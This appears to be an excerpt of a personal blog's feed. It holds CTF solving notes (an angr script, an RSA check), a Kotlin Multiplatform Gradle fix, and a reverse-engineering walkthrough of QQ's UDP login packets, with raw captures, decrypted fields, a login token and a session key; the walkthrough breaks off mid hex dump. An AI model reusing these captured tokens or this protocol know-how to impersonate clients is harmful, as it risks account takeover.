class="line"><span class="comment"># FLAG addr</span></span><br><span class="line"><span class="built_in">print</span>(project.loader.find_symbol(<span class="string">&quot;FLAG&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment"># 把 FLAG 填充到全局 FLAG 符号的内存位置里</span></span><br><span class="line">state.memory.store(project.loader.find_symbol(<span class="string">&quot;FLAG&quot;</span>).rebased_addr, flag)</span><br><span class="line"><span class="comment"># 构造一个模拟器</span></span><br><span class="line">simulation = project.factory.simulation_manager(state)</span><br><span class="line"><span class="comment"># 优化用的, 去掉也没事应该</span></span><br><span class="line">simulation.one_active.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"><span class="comment"># 这里同时用 puts(&quot;Well Done.&quot;) 和 puts(&quot;Nope.&quot;) 本身的地址和控制台输出检查作为 find 条件, 实际上可以只使用一个</span></span><br><span class="line">simulation.explore(find=[is_successful, <span class="number">0x004013f5</span>] , avoid=[should_abort, <span class="number">0x401414</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> deadended <span class="keyword">in</span> simulation.deadended:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Valid memory access triggered by %s&quot;</span> % <span class="built_in">repr</span>(deadended.posix.dumps(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> errored <span class="keyword">in</span> simulation.errored:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s caused by %s&quot;</span> % (errored.error, <span class="built_in">repr</span>(errored.state.posix.dumps(<span class="number">0</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> simulation.found:</span><br><span class="line"><span class="comment"># 输出 stdin 的内容</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input:&quot;</span>, s.posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 输出程序 stdout</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;output:&quot;</span>, s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 输出达到 is_successful 条件的 FLAG 值</span></span><br><span class="line">        <span class="built_in">print</span>(s.solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>).decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>遇到给出 N, E 和 C 的情况, 应该能确认是 RSA 了.<br>这个时候要确认是 RSA 加密还是签名, 不然可能会和我一样浪费几个小时在 RsaCtfTool 和 yafu 上面 (x)<br>可以在开始尝试解密的时候用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.number <span class="keyword">as</span> cun</span><br><span class="line"></span><br><span class="line">n = <span class="comment">#</span></span><br><span class="line">e = <span class="comment">#</span></span><br><span class="line">c = <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"><span class="built_in">print</span>(cun.long_to_bytes(p))</span><br></pre></td></tr></table></figure><p>看看是不是签名, 然后再尝试解密.  </p><h2 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h2><p>z3 solver 的 python 库可以用来求解约束.<br>比如在 <a href="https://github.com/Nambers/ctf-writeups/blob/main/hack-a-sat-qual-2023/based_emoji%20(late)/solve.md">hack-a-sat 里面有一个chal</a>是每个表情代表一个 32 以内的数字, 然后给出每个数字的因子和其他的一些条件, 这个时候就可以用 z3 solver 创建一系列变量然后给他们添加chal里给出的条件, 然后求解得到每一个的对应值.  </p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KotlinSourceSet with name &#39;unixMain&#39; not found.</title>
      <link href="/2022/09/23/kotlin-mpp-sourceset-not-found/"/>
      <url>/2022/09/23/kotlin-mpp-sourceset-not-found/</url>
      
        <content type="html"><![CDATA[<h2 id="0-背景"><a href="#0-背景" class="headerlink" title="0. 背景"></a>0. 背景</h2><p>build.gradle.kt</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    kotlin(<span class="string">&quot;multiplatform&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">group = <span class="string">&quot;tech.eritquearcus&quot;</span></span><br><span class="line">version = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">kotlin &#123;</span><br><span class="line">    jvm &#123;</span><br><span class="line">        compilations.all &#123;</span><br><span class="line">            kotlinOptions.jvmTarget = <span class="string">&quot;1.8&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        withJava()</span><br><span class="line">        testRuns[<span class="string">&quot;test&quot;</span>].executionTask.configure &#123;</span><br><span class="line">            useJUnitPlatform()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> hostOs = System.getProperty(<span class="string">&quot;os.name&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> isMingwX64 = hostOs.startsWith(<span class="string">&quot;Windows&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> nativeTarget = <span class="keyword">when</span> &#123;</span><br><span class="line">        hostOs == <span class="string">&quot;Mac OS X&quot;</span> -&gt; macosX64(<span class="string">&quot;unix&quot;</span>)</span><br><span class="line">        hostOs == <span class="string">&quot;Linux&quot;</span> -&gt; linuxX64(<span class="string">&quot;unix&quot;</span>)</span><br><span class="line">        isMingwX64 -&gt; mingwX64(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> -&gt; <span class="keyword">throw</span> GradleException(<span class="string">&quot;Host OS is not supported in Kotlin/Native.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        <span class="keyword">val</span> commonMain <span class="keyword">by</span> getting &#123;</span><br><span class="line">            dependencies &#123;</span><br><span class="line">  </span><br><span class="line">            &#125;</span><br><span class="line">            apply(plugin = <span class="string">&quot;org.jetbrains.kotlin.plugin.serialization&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> jvmMain <span class="keyword">by</span> getting</span><br><span class="line">        <span class="keyword">val</span> unixMain <span class="keyword">by</span> getting</span><br><span class="line">        <span class="keyword">val</span> winMain <span class="keyword">by</span> getting</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码里可以看出, 我是打算在 <code>unixMain</code> 和 <code>winMain</code> 下分别放 mac&#x2F;linux 平台的实现, <code>jvmMain</code> 下放 java 实现.<br>但是在我单纯在这个项目的 <code>src</code> 根目录下新建 <code>unixMain</code> 和 <code>winMain</code> 后, 我发现他不会自己链接这两个文件夹(像 <code>jvmMain</code> 和 <code>nativeMain</code> 一样), 然后报错:<br><img src="/images/kotlin-mpp.jpg" alt="file struct"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">KotlinSourceSet with name &#x27;unixMain&#x27; not found.</span><br><span class="line"></span><br><span class="line">* Try:</span><br><span class="line">&gt; Run with --info or --debug option to get more log output.</span><br><span class="line">&gt; Run with --scan to get full insights.</span><br><span class="line"></span><br><span class="line">* Exception is:</span><br><span class="line">org.gradle.api.UnknownDomainObjectException: KotlinSourceSet with name &#x27;unixMain&#x27; not found.</span><br><span class="line">at org.gradle.api.internal.DefaultNamedDomainObjectCollection.createNotFoundException(DefaultNamedDomainObjectCollection.java:504)</span><br><span class="line">at org.gradle.api.internal.DefaultNamedDomainObjectCollection.getByName(DefaultNamedDomainObjectCollection.java:333)</span><br><span class="line">at org.gradle.kotlin.dsl.NamedDomainObjectCollectionDelegateProvider.provideDelegate(NamedDomainObjectCollectionExtensions.kt:384)</span><br><span class="line">at Build_gradle$1$2.execute(build.gradle.kts:53)</span><br><span class="line">at Build_gradle$1$2.execute(build.gradle.kts:1)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="1-解决方法"><a href="#1-解决方法" class="headerlink" title="1. 解决方法"></a>1. 解决方法</h2><p>用</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> unixMain = maybeCreate(<span class="string">&quot;unixMain&quot;</span>).apply &#123;</span><br><span class="line">    <span class="keyword">this</span>.dependsOn(commonMain)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">val</span> winMain = maybeCreate(<span class="string">&quot;winMain&quot;</span>).apply &#123;</span><br><span class="line">    <span class="keyword">this</span>.dependsOn(commonMain)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> unixMain <span class="keyword">by</span> getting</span><br><span class="line"><span class="keyword">val</span> winMain <span class="keyword">by</span> getting</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Multiplatform </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq协议 0825 和 0836 udp 登录包解析</title>
      <link href="/2022/05/19/qq-0825-0836%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/05/19/qq-0825-0836%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="qq协议-0825-和-0836-udp-登录包解析"><a href="#qq协议-0825-和-0836-udp-登录包解析" class="headerlink" title="qq协议 0825 和 0836 udp 登录包解析"></a>qq协议 0825 和 0836 udp 登录包解析</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>0825包参考: <a href="https://www.cnblogs.com/mRRRR/p/5288931.html">https://www.cnblogs.com/mRRRR/p/5288931.html</a><br>虽然是2016年的, 但是里面的结构大体还是不变</p><p>参考: <a href="https://github.com/fa-ge/PCQQ-Protocol">https://github.com/fa-ge/PCQQ-Protocol</a><br>PCQQ协议的实现, 这里面基本都写清楚了, 但是能不能用我还没试过, 最后更新时间为2018年</p><p>TEA参考: <a href="https://github.com/ColasDAD/Py3QQTEA/blob/master/QQTEA.py">https://github.com/ColasDAD/Py3QQTEA/blob/master/QQTEA.py</a><br>用来解密QQ的TEA加密</p><p>QQ版本号参考: <a href="https://bbs.kafan.cn/thread-1295613-1-1.html">https://bbs.kafan.cn/thread-1295613-1-1.html</a></p><h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具:"></a>使用工具:</h3><ul><li>Python, 用来解密TEA, 方便的生成Hex和md5</li><li>网页的dev console, 有的时候可能用来做一些杂活, 比如统计hex长度以及replaceAll</li><li>Wireshark, 网卡抓包, 用来抓qq的udp登录包</li></ul><h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p>qq协议中的udp包通常从<code>02</code>这个字节开始, <code>03</code>这个字节结束, 然后后面紧跟着版本号然后就是命令, 本文以命令的2个字节作为这个包的名称, 比如:0825包的前面就是 023a570825.<br>下面的协议报文中的<code>..</code>省略号只是为了对齐, 别一起复制进去解密了</p><h3 id="udp报文解析"><a href="#udp报文解析" class="headerlink" title="udp报文解析"></a>udp报文解析</h3><h4 id="0825-udp-发送包"><a href="#0825-udp-发送包" class="headerlink" title="0825 udp 发送包"></a>0825 udp 发送包</h4><p>0825发送包(本机发送)</p><h4 id="报文原始数据"><a href="#报文原始数据" class="headerlink" title="报文原始数据:"></a>报文原始数据:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec4118251291c85acf44cc810800450000bf9143000040110000c0a81f2478e81418f57b1f4000ab6d89023a5708251115731717b40300000001010100006a4b00000000b899860003144579b8da863c1beed200abf0db243954f2e40089ac685f96cf905858602e7c87068d0f3c0cb7b33b17730f79ecd4d22ffdb42b98bb1c261aa2d7055a8a41def93ade17f969335848b41b8a2e671174a6487d81259c1f0b297501b8e542f04bbcc26acb7b5608d966a76ca0e0ca80648b0eee5f28bed43bd07ea12c2342bf092bd92703</span><br></pre></td></tr></table></figure><p>hex视图:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000   ec 41 18 25 12 91 c8 5a cf 44 cc 81 08 00 45 00</span><br><span class="line">0010   00 bf 91 43 00 00 40 11 00 00 c0 a8 1f 24 78 e8</span><br><span class="line">0020   14 18 f5 7b 1f 40 00 ab 6d 89 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 b8 99 86 00 03 14 45 79 b8 da 86 3c</span><br><span class="line">0050   1b ee d2 00 ab f0 db 24 39 54 f2 e4 00 89 ac 68</span><br><span class="line">0060   5f 96 cf 90 58 58 60 2e 7c 87 06 8d 0f 3c 0c b7</span><br><span class="line">0070   b3 3b 17 73 0f 79 ec d4 d2 2f fd b4 2b 98 bb 1c</span><br><span class="line">0080   26 1a a2 d7 05 5a 8a 41 de f9 3a de 17 f9 69 33</span><br><span class="line">0090   58 48 b4 1b 8a 2e 67 11 74 a6 48 7d 81 25 9c 1f</span><br><span class="line">00a0   0b 29 75 01 b8 e5 42 f0 4b bc c2 6a cb 7b 56 08</span><br><span class="line">00b0   d9 66 a7 6c a0 e0 ca 80 64 8b 0e ee 5f 28 be d4</span><br><span class="line">00c0   3b d0 7e a1 2c 23 42 bf 09 2b d9 27 03</span><br></pre></td></tr></table></figure><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>qq协议头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>02</code> qq报文指定前缀</li><li><code>3a 57</code> 版本号, 可从<a href="https://bbs.kafan.cn/thread-1295613-100-1.html#:~:text=3A57%3D%22QQ9.5.9%20%E7%81%B0%E5%BA%A6%E6%AD%A3%E5%BC%8F%E7%89%88(28605/28606)%22">这里</a> 得知为QQ9.5.9 灰度正式版(28605&#x2F;28606)</li><li><code>08 25</code> 登录命令</li><li><code>11 15</code> 序列号, 序列号默认为每个包递增</li><li><code>73 17 17 b4</code> qq id hex</li><li><code>03 00 00</code> fixed const</li><li><code>00 01 01 01</code> 客户端类型</li><li><code>00 00 6a 4b</code> 发行编号</li><li><code>00 00 00 00</code> fixed const</li></ul><p>TEA密钥, 16字节长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040   .. .. .. .. b8 99 86 00 03 14 45 79 b8 da 86 3c</span><br><span class="line">0050   1b ee d2 00 .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>TEA密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0050   .. .. .. .. ab f0 db 24 39 54 f2 e4 00 89 ac 68</span><br><span class="line">0060   5f 96 cf 90 58 58 60 2e 7c 87 06 8d 0f 3c 0c b7</span><br><span class="line">0070   b3 3b 17 73 0f 79 ec d4 d2 2f fd b4 2b 98 bb 1c</span><br><span class="line">0080   26 1a a2 d7 05 5a 8a 41 de f9 3a de 17 f9 69 33</span><br><span class="line">0090   58 48 b4 1b 8a 2e 67 11 74 a6 48 7d 81 25 9c 1f</span><br><span class="line">00a0   0b 29 75 01 b8 e5 42 f0 4b bc c2 6a cb 7b 56 08</span><br><span class="line">00b0   d9 66 a7 6c a0 e0 ca 80 64 8b 0e ee 5f 28 be d4</span><br><span class="line">00c0   3b d0 7e a1 2c 23 42 bf 09 2b d9 27 ..</span><br></pre></td></tr></table></figure><p>用Tea解密结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001800160001 0000045f00000001000016ff 731717b4 0000 00000309000a 000a0004 78e815b6 0002003600120002000100000000000000000000000000000114001d0103 0019 027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a 051100060a0000000001</span><br></pre></td></tr></table></figure><ul><li><code>001800160001</code> 固定6字节</li><li><code>0000045f00000001000016ff</code> 固定12字节</li><li><code>731717b4</code> qqid</li><li><code>0000</code> fixed const</li><li><code>78e815b6</code> 120.232.20.24 目标服务器(dst)的ip hex, 可以用<a href="https://www.browserling.com/tools/ip-to-hex">这个工具</a>生成</li><li><code>0019</code> 后面token的长度为25字节</li><li><code>027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a</code> token</li><li><code>051100060a0000000001</code> fixed const</li></ul><p>固定结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00c0   .. .. .. .. .. .. .. .. .. .. .. .. 03</span><br></pre></td></tr></table></figure><h4 id="0825-返回包"><a href="#0825-返回包" class="headerlink" title="0825 返回包"></a>0825 返回包</h4><p>0825返回包(服务器发送)</p><h5 id="原始数据"><a href="#原始数据" class="headerlink" title="原始数据"></a>原始数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c85acf44cc81ec41182512910800457400939b12400035113d0778e81418c0a81f241f40f57b007fde35023a5708251115731717b40000006bb7f0867436bf1be9b560a67834497e59f60988affe5d52594f92dde9a60e7361741a79ad9ea1180886c51514a8b9f9ddd3a38348da8b08fdac2f84a5c73758940a5c0168cc6adfca142de0ef763e7d07a9ced632930d4350fc53e5a325324146249a56d823545103</span><br></pre></td></tr></table></figure><p>hex视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000   c8 5a cf 44 cc 81 ec 41 18 25 12 91 08 00 45 74</span><br><span class="line">0010   00 93 9b 12 40 00 35 11 3d 07 78 e8 14 18 c0 a8</span><br><span class="line">0020   1f 24 1f 40 f5 7b 00 7f de 35 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 00 00 00 6b b7 f0 86 74 36 bf 1b</span><br><span class="line">0040   e9 b5 60 a6 78 34 49 7e 59 f6 09 88 af fe 5d 52</span><br><span class="line">0050   59 4f 92 dd e9 a6 0e 73 61 74 1a 79 ad 9e a1 18</span><br><span class="line">0060   08 86 c5 15 14 a8 b9 f9 dd d3 a3 83 48 da 8b 08</span><br><span class="line">0070   fd ac 2f 84 a5 c7 37 58 94 0a 5c 01 68 cc 6a df</span><br><span class="line">0080   ca 14 2d e0 ef 76 3e 7d 07 a9 ce d6 32 93 0d 43</span><br><span class="line">0090   50 fc 53 e5 a3 25 32 41 46 24 9a 56 d8 23 54 51</span><br><span class="line">00a0   03</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h5><p>qq协议头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 00 00 00 .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>3a 57</code> qq版本号</li><li><code>08 25</code> 登录命令</li><li><code>11 15</code> 序列号</li><li><code>73 17 17 b4</code> qq id hex</li><li><code>00 00 00</code> fixed const</li></ul><p>密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0030   .. .. .. .. .. .. .. .. 6b b7 f0 86 74 36 bf 1b</span><br><span class="line">0040   e9 b5 60 a6 78 34 49 7e 59 f6 09 88 af fe 5d 52</span><br><span class="line">0050   59 4f 92 dd e9 a6 0e 73 61 74 1a 79 ad 9e a1 18</span><br><span class="line">0060   08 86 c5 15 14 a8 b9 f9 dd d3 a3 83 48 da 8b 08</span><br><span class="line">0070   fd ac 2f 84 a5 c7 37 58 94 0a 5c 01 68 cc 6a df</span><br><span class="line">0080   ca 14 2d e0 ef 76 3e 7d 07 a9 ce d6 32 93 0d 43</span><br><span class="line">0090   50 fc 53 e5 a3 25 32 41 46 24 9a 56 d8 23 54 51</span><br></pre></td></tr></table></figure><p>Tea用一开始的tea key解密结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 0112 0038 b36b6e93dd2c93a0efff4a129df6b1103e80975e46188430cc6142f62409b14d53fbfa576d2d835ddadce4d0cb8be9206ff46063c72f67f4 0017000e0001 6274c3a4 78ebbf1fd4b5000003100004 78e81418</span><br></pre></td></tr></table></figure><ul><li><code>00</code> 无需更换服务器</li><li><code>0112</code> fixed const</li><li><code>b36b6e93dd2c93a0efff4a129df6b1103e80975e46188430cc6142f62409b14d53fbfa576d2d835ddadce4d0cb8be9206ff46063c72f67f4</code> 密钥</li><li><code>0017000e0001</code> fixed const</li><li><code>6274c3a4</code> 时间hex</li><li><code>78e81418</code> 120.232.20.24 来源服务器的ip hex</li></ul><p>固定结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00a0   03</span><br></pre></td></tr></table></figure><h4 id="0836-发送包"><a href="#0836-发送包" class="headerlink" title="0836 发送包"></a>0836 发送包</h4><p>0836发送包</p><h5 id="原始数据-1"><a href="#原始数据-1" class="headerlink" title="原始数据"></a>原始数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec4118251291c85acf44cc810800450003429144000040110000c0a81f2478e81418f57b1f40032e700c023a5708366148731717b40300000001010100006a4b00000000000201030019027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a0000001066762c87707cf5de93d9c7e837e8e7e6883ebe9cd158374921efa7d4392e33ef9ae0965988257ce5e3b9ae9e4d31c2dfed7eb5b5da7d863de63df01b5e22bf8e383cff4ed00bfea9760cd8de7f1177effc1d716cbdf775e56e032a04dd2f2444fa9a607f3ff2bcb0f3229acc2e889dc5eb9a7f23b581b0f39b60eed3a104233c38f6736a2acd7a0ccf932fb00de2c61718c5d81ec950a2be7676eb096d84484198b11b7deb69c7680293878f6936f4ce310f1f86e44d3913c97693188f9728007b44d1f82e7a645425f6667f71c8411f424144693c034f96ed317b8e89f8b8875ab56721a1d5b6f87dac83a2be459c2460686a88ad9dbde2f5ed6a8548f3ab05ee3c1e86a81cc811596e66f1d3a26a6f5d4a80662a0bf00827a8c49837dc02e70fd51bab408ad7e3a9b807905cfbd5666bf606e72f7ba7af53424ab5dec46e0294812d70198268985fae1b13703c28e27c88d69afae91d6db9c4a83c558ba8d8ce2acc3e3fd4d0e983f80f84e2d3d3172ea1584fcf15f26190a3416deb76934dcabfec6e19d0b0d0c7d1e1a37350b8bcc9d374d1ad62361b70bc2224dfc1d39c4d94ba017ffd7c397435e188ece1c2829895d1e0ff972291a83c045a4bf85997c662dfed3a23e757211743f2de7b0ba543f93d6c9a993130b338746a5892209397dbe58735f49d4c10fc320186bbd06140e777124e0ba96a2c1d64bbde0af54bee2b0140c720b5033497a863224b971f905985c4ea411658defbd211ae53906279458c6f5682bfc5a77f6ee8908b40d72f81236d40f225fe63112813128c2a2bc5d1a399766b7e767c098c1c3ce397e3b7434ceb3996cb885b652266187489dd428dad24f57105f8c17cd34d007c57acea0a0e7a6d8af4bb96cf4508b3d733af44b739c8c997323cf7909f7486c04115d251dca4fde643f10c504e99ba3a58ba99d8a77912501ca56dd6bfec2be69d22639915e9387bb19b6ef8ae954b24aadf750b28c8727adac8ef2be125ef5618ad42780d9acbb33b4ffd196490e5b531a5e8d87c84e641878103</span><br></pre></td></tr></table></figure><p>hex视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0000   ec 41 18 25 12 91 c8 5a cf 44 cc 81 08 00 45 00</span><br><span class="line">0010   03 42 91 44 00 00 40 11 00 00 c0 a8 1f 24 78 e8</span><br><span class="line">0020   14 18 f5 7b 1f 40 03 2e 70 0c 02 3a 57 08 36 61</span><br><span class="line">0030   48 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 00 02 01 03 00 19 02 7b b7 5b fb ed</span><br><span class="line">0050   8d 28 d1 f1 bc ad 20 65 b2 4b dc 59 4a b8 a5 2f</span><br><span class="line">0060   60 d8 8a 00 00 00 10 66 76 2c 87 70 7c f5 de 93</span><br><span class="line">0070   d9 c7 e8 37 e8 e7 e6 88 3e be 9c d1 58 37 49 21</span><br><span class="line">0080   ef a7 d4 39 2e 33 ef 9a e0 96 59 88 25 7c e5 e3</span><br><span class="line">0090   b9 ae 9e 4d 31 c2 df ed 7e b5 b5 da 7d 86 3d e6</span><br><span class="line">00a0   3d f0 1b 5e 22 bf 8e 38 3c ff 4e d0 0b fe a9 76</span><br><span class="line">00b0   0c d8 de 7f 11 77 ef fc 1d 71 6c bd f7 75 e5 6e</span><br><span class="line">00c0   03 2a 04 dd 2f 24 44 fa 9a 60 7f 3f f2 bc b0 f3</span><br><span class="line">00d0   22 9a cc 2e 88 9d c5 eb 9a 7f 23 b5 81 b0 f3 9b</span><br><span class="line">00e0   60 ee d3 a1 04 23 3c 38 f6 73 6a 2a cd 7a 0c cf</span><br><span class="line">00f0   93 2f b0 0d e2 c6 17 18 c5 d8 1e c9 50 a2 be 76</span><br><span class="line">0100   76 eb 09 6d 84 48 41 98 b1 1b 7d eb 69 